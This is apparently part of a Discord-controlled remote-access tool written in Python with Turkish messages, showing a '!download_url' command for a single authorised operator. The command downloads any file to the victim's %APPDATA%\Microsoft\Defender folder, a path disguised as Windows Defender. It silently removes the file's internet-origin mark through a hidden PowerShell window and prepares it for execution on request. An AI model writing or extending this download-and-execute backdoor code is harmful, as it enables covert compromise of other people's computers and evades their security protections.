@bot.command(name="download_url")
async def download_url(ctx, *, arg: str = ""):
    if ctx.author.id != ALLOWED_USER_ID:
        return
    if not arg.strip():
        await ctx.send("Kullanım: `!download_url <url>` veya `!download_url help`")
        return
    if arg.lower() == "help":
        await ctx.send("**!download_url Kullanımı:**\n`!download_url <doğrudan dosya URL'si>`\nDosya %APPDATA% klasörüne indirilir.\nÇalıştırmak için `!yes` veya `!no` yazın.\n`!no` ile dosya silinir.\nDaha sonra çalıştırmak için `!run_file <dosya_adı>` kullanın.\nÖrnek: `!download_url https://github.com/aaleaf/Laze/releases/download/Laze/Laze.exe`")
        return
    url = arg.strip()
    try:
        await ctx.send(f"⏳ Dosya indiriliyor: {url}")
        response = requests.get(url, stream=True)
        if response.status_code != 200:
            await ctx.send(f"❌ İndirme başarısız: HTTP {response.status_code}")
            return
        content_disposition = response.headers.get('content-disposition')
        if content_disposition:
            filename = re.findall("filename=(.+)", content_disposition)[0].strip('"')
        else:
            filename = os.path.basename(url.split('?')[0]) or "downloaded_file"
        appdata = os.environ.get('APPDATA')
        download_dir = os.path.join(appdata, 'Microsoft', 'Defender')
        os.makedirs(download_dir, exist_ok=True)
        file_path = os.path.join(download_dir, filename)
        with open(file_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                if chunk:
                    f.write(chunk)
        subprocess.run(
            f'powershell -Command "Unblock-File -Path \'{file_path}\'"',
            shell=True,
            capture_output=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        await ctx.send(f"✅ Dosya indirildi: `{filename}` ({os.path.getsize(file_path)/1024/1024:.2f} MB)\n📁 Konum: `{download_dir}`")
        pending_downloads[ctx.author.id] = {
            "path": file_path,
            "filename": filename,
            "ctx": ctx
        }
        await ctx.send("❓ Çalıştırılsın mı? `!yes` veya `!no` yazın.")
    except Exception as e:
        await ctx.send(f"❌ Hata: {e}")

